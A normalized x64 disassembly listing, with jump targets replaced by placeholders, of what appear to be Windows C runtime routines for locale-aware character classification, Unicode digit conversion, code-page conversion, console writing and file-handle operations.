mov [ rsp + 0x20 ] rax
call [ MultiByteToWideChar@IAT ]
mov r14d eax
mov rcx [ rbp + 0x78 ]
movsxd r9 edi
mov rdx rax
mov r8 rbx
call sub_1800101b0
test eax eax
je r-xdata
lea edi [ rax - 0x1 ]
xor eax eax
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180008c80
jmp r-xdata
sub_1800115d0
mov rax rsp
push rbx
sub rsp 0x70
mov [ rax + 0x8 ] rbp
mov [ rax + 0x18 ] rdi
xor dil dil
test rcx rcx
mov [ rax - 0x10 ] r12
mov [ rax - 0x18 ] r13
mov [ rax - 0x20 ] dil
mov rbp r9
mov r12d r8d
mov r13d edx
jne r-xdata
mov rax [ rcx ]
lea rdx [ rsp + 0x40 ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
movzx edi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
mov [ rax + 0x10 ] rsi
call sub_18000a690
mov rcx [ rax + 0xc0 ]
mov rsi [ rax + 0xb8 ]
mov rbx rax
cmp rcx [ rw-data ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rsi
je r-xdata
add rsp 0x70
pop rbx
retn
and [ rbx + 0xc8 ] 0xfffffffd
cmp rsi [ rw-data ]
mov rsi [ rsp + 0x88 ]
je r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test [ rbx + 0xc8 ] 0x2
jne r-xdata
mov eax [ rbx + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov [ rsp + 0x40 ] rax
mov eax [ rsp + 0xb8 ]
lea rcx [ rsp + 0x40 ]
mov r9 rbp
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0xb0 ]
mov r8d r12d
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0xa8 ]
mov edx r13d
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0xa0 ]
mov [ rsp + 0x20 ] eax
call sub_180011210
mov r13 [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
mov rbp [ rsp + 0x80 ]
test dil dil
mov rdi [ rsp + 0x90 ]
je r-xdata
or [ rbx + 0xc8 ] 0x2
mov dil 0x1
mov [ rsp + 0x58 ] dil
jmp r-xdata
call sub_18000cd30
mov [ rsp + 0x48 ] rax
sub_180011720
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x60
cmp cx 0xffff
movzx ebx dx
jne r-xdata
cmp cx 0x100
jae r-xdata
xor cx cx
movzx eax cx
movzx ecx dx
and eax ecx
add rsp 0x60
pop rbx
retn
test r8 r8
mov [ rsp + 0x58 ] 0x0
jne r-xdata
mov rax [ rw-data ]
movzx ecx cx
movzx ecx [ rax + rcx * 2 ]
and cx bx
movzx eax cx
movzx ecx bx
and eax ecx
add rsp 0x60
pop rbx
retn
mov rax [ r8 ]
lea rcx [ rsp + 0x40 ]
mov [ rcx ] rax
mov rax [ r8 + 0x8 ]
mov [ rcx + 0x8 ] rax
call sub_18000a690
mov [ rsp + 0x50 ] rax
mov rdx [ rax + 0xc0 ]
cmp rdx [ rw-data ]
mov [ rsp + 0x40 ] rdx
mov r8 [ rax + 0xb8 ]
mov [ rsp + 0x48 ] r8
je r-xdata
movzx eax cx
movzx ecx bx
and eax ecx
add rsp 0x60
pop rbx
retn
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov cx [ rsp + 0x78 ]
cmp r8 [ rw-data ]
je r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov r8 [ rsp + 0x48 ]
mov rdx rax
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x50 ]
mov eax [ rdx + 0x14 ]
mov r9d 0x1
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rdx + 0x4 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x78 ]
mov edx r9d
mov [ rsp + 0x20 ] rax
call sub_180012bf0
mov cx [ rsp + 0x78 ]
xor edx edx
test eax eax
cmove cx dx
cmp [ rsp + 0x58 ] dl
mov [ rsp + 0x78 ] cx
je r-xdata
or [ rax + 0xc8 ] 0x2
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
call sub_18000cd30
mov rdx [ rsp + 0x40 ]
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x50 ]
mov rdx [ rsp + 0x40 ]
sub_180011890
push rbx
sub rsp 0x40
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rdi
xor dil dil
test rdx rdx
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x38 ] dil
mov r12d ecx
jne r-xdata
mov rax [ rdx ]
lea rcx [ rsp + 0x20 ]
mov [ rcx ] rax
mov rax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] rax
movzx edi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x20 ]
mov [ rsp + 0x50 ] rbp
call sub_18000a690
mov rsi [ rax + 0xc0 ]
mov rbp [ rax + 0xb8 ]
mov rbx rax
cmp rsi [ rw-data ]
je r-xdata
add rsp 0x40
pop rbx
retn
and [ rbx + 0xc8 ] 0xfffffffd
cmp rbp [ rw-data ]
mov rbp [ rsp + 0x50 ]
je r-xdata
mov edx [ rax + 0xc8 ]
test [ rw-data ] edx
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test cl 0x2
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov rsi rax
mov rax [ rsi + 0x140 ]
mov rsi [ rsp + 0x58 ]
movzx ecx r12b
mov ax [ rax + rcx * 2 ]
mov r12 [ rsp + 0x68 ]
and eax 0x8000
test dil dil
mov rdi [ rsp + 0x60 ]
je r-xdata
or ecx 0x2
mov dil 0x1
mov [ rbx + 0xc8 ] ecx
jmp r-xdata
call sub_18000cd30
sub_180011980
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov r12d ecx
xor bpl bpl
call sub_18000a690
mov rsi [ rax + 0xc0 ]
mov rdi [ rax + 0xb8 ]
mov rbx rax
cmp rsi [ rw-data ]
je r-xdata
cmp rdi [ rw-data ]
je r-xdata
mov edx [ rax + 0xc8 ]
test [ rw-data ] edx
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test cl 0x2
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov rsi rax
mov rax [ rsi + 0x140 ]
movzx ecx r12b
mov ax [ rax + rcx * 2 ]
and eax 0x8000
test bpl bpl
je r-xdata
or ecx 0x2
mov bpl 0x1
mov [ rbx + 0xc8 ] ecx
call sub_18000cd30
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
and [ rbx + 0xc8 ] 0xfffffffd
sub_180011a50
mov [ rsp + 0x20 ] rbx
push rsi
sub rsp 0x60
test r8 r8
mov esi edx
movsxd rbx ecx
mov [ rsp + 0x58 ] 0x0
jne r-xdata
mov rax [ r8 ]
lea rcx [ rsp + 0x40 ]
mov [ rcx ] rax
mov rax [ r8 + 0x8 ]
mov [ rcx + 0x8 ] rax
mov r11 [ rsp + 0x50 ]
call sub_18000a690
mov [ rsp + 0x50 ] rax
mov r11 rax
mov r8 [ rax + 0xc0 ]
cmp r8 [ rw-data ]
mov [ rsp + 0x40 ] r8
mov rax [ rax + 0xb8 ]
mov [ rsp + 0x48 ] rax
je r-xdata
mov [ rsp + 0x78 ] rdi
mov edi ebx
lea rdx [ rsp + 0x40 ]
sar edi 0x8
movzx ecx dil
call sub_180011890
test eax eax
je r-xdata
mov rax [ rsp + 0x40 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rbx * 2 ]
and eax esi
cmp [ rsp + 0x58 ] 0x0
je r-xdata
cmp rax [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
mov [ rsp + 0x80 ] bl
mov [ rsp + 0x81 ] 0x0
mov r9d 0x1
mov [ rsp + 0x80 ] dil
mov [ rsp + 0x81 ] bl
mov [ rsp + 0x82 ] 0x0
mov r9d 0x2
jmp r-xdata
mov rbx [ rsp + 0x88 ]
add rsp 0x60
pop rsi
retn
and [ r11 + 0xc8 ] 0xfffffffd
mov rbx [ rsp + 0x88 ]
add rsp 0x60
pop rsi
retn
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov eax [ r11 + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x50 ]
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x48 ]
movzx eax [ rsp + 0x70 ]
and eax esi
cmp [ rsp + 0x58 ] 0x0
je r-xdata
cmp [ rsp + 0x58 ] al
je r-xdata
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] 0x1
lea r8 [ rsp + 0x80 ]
mov eax [ rcx + 0x14 ]
mov edx 0x1
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] rax
call sub_180010c30
mov rdi [ rsp + 0x78 ]
test eax eax
jne r-xdata
lea eax [ rbx + 0x1 ]
cmp eax 0x100
ja r-xdata
or [ r11 + 0xc8 ] 0x2
mov r11 [ rsp + 0x50 ]
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x50 ]
mov [ rsp + 0x48 ] rax
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rbx [ rsp + 0x88 ]
add rsp 0x60
pop rsi
retn
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180011c40
cmp cx 0x30
jb r-xdata
or eax 0xffffffff
retn
cmp cx 0x3a
jae r-xdata
cmp cx 0xff10
jae r-xdata
movzx eax cx
sub eax 0x30
retn
cmp cx 0xff1a
jae r-xdata
cmp cx 0x660
jb r-xdata
movzx eax cx
sub eax 0xff10
retn
cmp cx 0x66a
jae r-xdata
cmp cx 0x6f0
jb r-xdata
movzx eax cx
sub eax 0x660
retn
cmp cx 0x6fa
jae r-xdata
cmp cx 0x966
jb r-xdata
movzx eax cx
sub eax 0x6f0
retn
cmp cx 0x970
jae r-xdata
cmp cx 0x9e6
jb r-xdata
movzx eax cx
sub eax 0x966
retn
cmp cx 0x9f0
jae r-xdata
cmp cx 0xa66
jb r-xdata
movzx eax cx
sub eax 0x9e6
retn
cmp cx 0xa70
jae r-xdata
cmp cx 0xae6
jb r-xdata
movzx eax cx
sub eax 0xa66
retn
cmp cx 0xaf0
jae r-xdata
cmp cx 0xb66
jb r-xdata
movzx eax cx
sub eax 0xae6
retn
cmp cx 0xb70
jae r-xdata
cmp cx 0xc66
jb r-xdata
movzx eax cx
sub eax 0xb66
retn
cmp cx 0xc70
jae r-xdata
cmp cx 0xce6
jb r-xdata
movzx eax cx
sub eax 0xc66
retn
cmp cx 0xcf0
jae r-xdata
cmp cx 0xd66
jb r-xdata
movzx eax cx
sub eax 0xce6
retn
cmp cx 0xd70
jae r-xdata
cmp cx 0xe50
jb r-xdata
movzx eax cx
sub eax 0xd66
retn
cmp cx 0xe5a
jae r-xdata
cmp cx 0xed0
jb r-xdata
movzx eax cx
sub eax 0xe50
retn
cmp cx 0xeda
jae r-xdata
cmp cx 0xf20
jb r-xdata
movzx eax cx
sub eax 0xed0
retn
cmp cx 0xf2a
jae r-xdata
cmp cx 0x1040
jb r-xdata
movzx eax cx
sub eax 0xf20
retn
cmp cx 0x104a
jae r-xdata
cmp cx 0x17e0
jb r-xdata
movzx eax cx
sub eax 0x1040
retn
cmp cx 0x17ea
jae r-xdata
cmp cx 0x1810
jb r-xdata
movzx eax cx
sub eax 0x17e0
retn
cmp cx 0x181a
jae r-xdata
movzx eax cx
sub eax 0x1810
retn
sub_180011e20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov ebp ecx
xor sil sil
call sub_18000a690
mov rdx [ rax + 0xc0 ]
mov rdi [ rax + 0xb8 ]
mov rbx rax
cmp rdx [ rw-data ]
je r-xdata
cmp rdi [ rw-data ]
je r-xdata
mov edx [ rax + 0xc8 ]
test [ rw-data ] edx
jne r-xdata
mov ecx [ rbx + 0xc8 ]
test cl 0x2
jne r-xdata
mov eax [ rbx + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
movzx eax bpl
movzx eax [ rax + rdi + 0x1d ]
shr eax 0x2
and eax 0x1
test sil sil
je r-xdata
or ecx 0x2
mov sil 0x1
mov [ rbx + 0xc8 ] ecx
call sub_18000cd30
mov rdi rax
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
and [ rbx + 0xc8 ] 0xfffffffd
sub_180011ee0
push rbx
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
xor ebx ebx
mov [ rsp + 0x40 ] cx
cmp [ rw-data ] ebx
je r-xdata
call [ GetConsoleOutputCP@IAT ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rbx
mov ecx eax
lea rax [ rsp + 0x48 ]
lea r8 [ rsp + 0x40 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] 0x5
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
or ax 0xffff
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_180006970
add rsp 0x60
pop rbx
retn
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x48 ]
mov r8d eax
mov [ rsp + 0x20 ] rbx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
cmp rcx 0xffffffffffffffff
je r-xdata
call sub_180012d30
mov rcx [ rw-data ]
mov ax [ rsp + 0x40 ]
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_180006970
add rsp 0x60
pop rbx
retn
lea r9 [ rsp + 0x44 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
mov [ rsp + 0x20 ] rbx
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] ebx
sub_180012010
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
test rdx rdx
mov rsi r8
mov rdi rdx
mov rbx rcx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] 0x0
jne r-xdata
test r9 r9
mov [ rsp + 0x48 ] 0x0
jne r-xdata
test rcx rcx
je r-xdata
mov rax [ r9 ]
lea rcx [ rsp + 0x30 ]
mov [ rcx ] rax
mov rax [ r9 + 0x8 ]
mov [ rcx + 0x8 ] rax
call sub_18000a690
mov [ rsp + 0x40 ] rax
mov r11 rax
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
mov [ rsp + 0x30 ] rcx
mov rax [ rax + 0xb8 ]
mov [ rsp + 0x38 ] rax
je r-xdata
mov [ rcx ] 0x0
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_180011890
test eax eax
je r-xdata
test rbx rbx
je r-xdata
cmp rax [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
xor eax eax
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x30 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov eax [ r11 + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x38 ]
call sub_180008e80
mov [ rax ] 0x2a
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
and [ r11 + 0xc8 ] 0xfffffffd
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
or [ r11 + 0xc8 ] 0x2
mov [ rsp + 0x48 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x38 ] rax
or eax 0xffffffff
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov eax 0x1
add rsp 0x50
pop rdi
retn
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rdi + 0x1 ] 0x0
je r-xdata
mov ecx [ rcx + 0x4 ]
xor eax eax
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
mov rcx [ rsp + 0x30 ]
jne r-xdata
mov r11 [ rsp + 0x40 ]
cmp [ rsp + 0x48 ] 0x0
mov eax [ rcx + 0x10c ]
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
sub_180012280
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180008e80
mov [ rax ] 0x9
xor eax eax
add rsp 0x38
retn
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x9
call sub_180008d20
xor eax eax
add rsp 0x38
retn
cmp ecx [ rw-data ]
jae r-xdata
movsxd rax ecx
lea r8 [ rw-data ]
mov cl al
mov rdx rax
sar rdx 0x5
and ecx 0x1f
mov rax [ r8 + rdx * 8 ]
imul rcx rcx 0x58
mov al [ rax + rcx + 0x8 ]
and eax 0x40
add rsp 0x38
retn
sub_180012300
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_180006360
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ rsp + 0x38 ] eax
jne r-xdata
call sub_180008e80
mov [ rax ] 0x9
or rax 0xffffffffffffffff
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov cl bl
mov rdx rbx
mov rbx [ rsp + 0x30 ]
sar rdx 0x5
and ecx 0x1f
lea r8 [ rw-data ]
mov rax [ r8 + rdx * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov ecx eax
call sub_180008ee0
or rax 0xffffffffffffffff
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800123b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_180006360
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
cmp edi 0x1
jne r-xdata
xor eax eax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx ebx
call sub_180008ee0
or eax 0xffffffff
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp edi 0x2
jne r-xdata
mov rax [ rw-data ]
test [ rax + 0xb8 ] dil
jne r-xdata
mov ecx edi
call sub_180006360
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
mov rax [ rw-data ]
test [ rax + 0x60 ] 0x1
je r-xdata
mov ecx 0x2
call sub_180006360
mov ecx 0x1
mov rbx rax
call sub_180006360
cmp rax rbx
je r-xdata
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180006290
mov r11 rdi
mov rax rdi
sar rax 0x5
and r11d 0x1f
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
imul r11 r11 0x58
test ebx ebx
mov [ rax + r11 + 0x8 ] 0x0
je r-xdata
sub_180012480
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x30
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180008eb0
xor ebx ebx
mov [ rax ] ebx
call sub_180008e80
mov [ rax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_180008eb0
xor ebx ebx
mov [ rax ] ebx
call sub_180008e80
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
mov dil bl
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
mov cl [ rax + rdi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_180006400
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_180008eb0
xor ebx ebx
mov [ rax ] ebx
call sub_180008e80
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_1800123b0
mov edi eax
jmp r-xdata
mov ecx ebx
call sub_1800064d0
mov eax edi
jmp r-xdata
sub_1800125d0
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x28 ] rax
lea r8 [ rsp + 0x20 ]
mov r9d 0x6
mov edx 0x1004
mov [ rsp + 0x26 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea rcx [ rsp + 0x20 ]
call sub_1800125c0
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_180006970
add rsp 0x38
retn
or eax 0xffffffff
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_180006970
add rsp 0x38
retn
sub_180012640
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
lea rbp [ rsp + 0x40 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x30 ] rax
mov r15 [ rbp + 0xb0 ]
mov r12d [ r9 ]
xor r13d r13d
cmp ecx edx
mov rbx r8
mov rsi r13
mov [ rbp ] r13d
mov [ rbp + 0x10 ] r9
mov r14d edx
mov [ rbp + 0x8 ] rbx
mov edi ecx
mov [ rbp + 0x4 ] ecx
je r-xdata
mov rax rsi
lea rdx [ rbp + 0x18 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov r9d r12d
mov r8 rbx
mov edx 0x1
mov ecx edi
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r13
call [ MultiByteToWideChar@IAT ]
test eax eax
mov ebx eax
jne r-xdata
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
test ebx ebx
jle r-xdata
xor eax eax
jmp r-xdata
lea rdx [ rbp + 0x18 ]
mov ecx r14d
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
movsxd r13 ebx
mov rax 0x7ffffffffffffff0
cmp r13 rax
ja r-xdata
mov rcx [ rbp + 0x30 ]
xor rcx rbp
call sub_180006970
lea rsp [ rbp + 0x48 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
cmp r12d 0xffffffff
mov [ rbp ] 0x1
je r-xdata
call sub_180007310
test rax rax
mov rdi rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
or rcx 0xffffffffffffffff
mov rdi rbx
xor eax eax
[ rdi ]
not rcx
mov ebx ecx
jmp r-xdata
mov ebx r12d
test rdi rdi
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180013210
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax 0xffffffffffffff0
lea r8 [ r13 + r13 ]
xor edx edx
mov rcx rdi
call sub_1800059c0
mov r8 [ rbp + 0x8 ]
mov ecx [ rbp + 0x4 ]
mov r9d r12d
mov edx 0x1
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
cmp [ rdi - 0x10 ] 0xdddd
lea rcx [ rdi - 0x10 ]
jne r-xdata
test r15 r15
je r-xdata
add rdi 0x10
call sub_1800085f0
xor r13d r13d
cmp [ rbp ] esi
jne r-xdata
xor eax eax
mov r9d ebx
mov r8 rdi
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rax
mov eax [ rbp + 0xb8 ]
mov [ rsp + 0x28 ] eax
xor edx edx
mov ecx r14d
mov [ rsp + 0x20 ] r15
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movsxd rdx ebx
mov ecx 0x1
call sub_180008870
test rax rax
mov rsi rax
je r-xdata
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov r9d ebx
mov r8 rdi
xor edx edx
mov ecx r14d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] r13
call [ WideCharToMultiByte@IAT ]
test eax eax
mov ebx eax
je r-xdata
mov rsi r15
jmp r-xdata
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov r9d ebx
mov r8 rdi
xor edx edx
mov ecx r14d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
cmp r12d 0xffffffff
je r-xdata
mov rcx rsi
call sub_1800085f0
mov rsi r13
jmp r-xdata
mov rcx [ rbp + 0x10 ]
mov [ rcx ] eax
sub_1800128d0
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x60
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x50 ] rbx
mov [ rbp + 0x58 ] rsi
mov [ rbp + 0x60 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x18 ] rax
movsxd r13 r9d
mov rdi r8
mov ebx edx
cmp r13d 0xffffffff
mov [ rbp ] edx
mov rsi rcx
mov [ rbp + 0x10 ] rcx
jl r-xdata
xor eax eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov r8d 0x1
lea r9 [ rbp + 0x4 ]
lea rdx [ r--data ]
mov ecx r8d
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x2
je r-xdata
mov r9 [ rbp + 0x70 ]
mov r8d r13d
mov rdx rdi
mov ecx ebx
call [ GetStringTypeW@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov r12d [ rbp + 0x80 ]
xor r14d r14d
test r12d r12d
mov r15d r14d
jne r-xdata
test eax eax
jne r-xdata
mov rcx [ rbp + 0x18 ]
xor rcx rbp
call sub_180006970
mov rbx [ rbp + 0x50 ]
mov rsi [ rbp + 0x58 ]
mov rdi [ rbp + 0x60 ]
lea rsp [ rbp + 0x20 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov eax [ rw-data ]
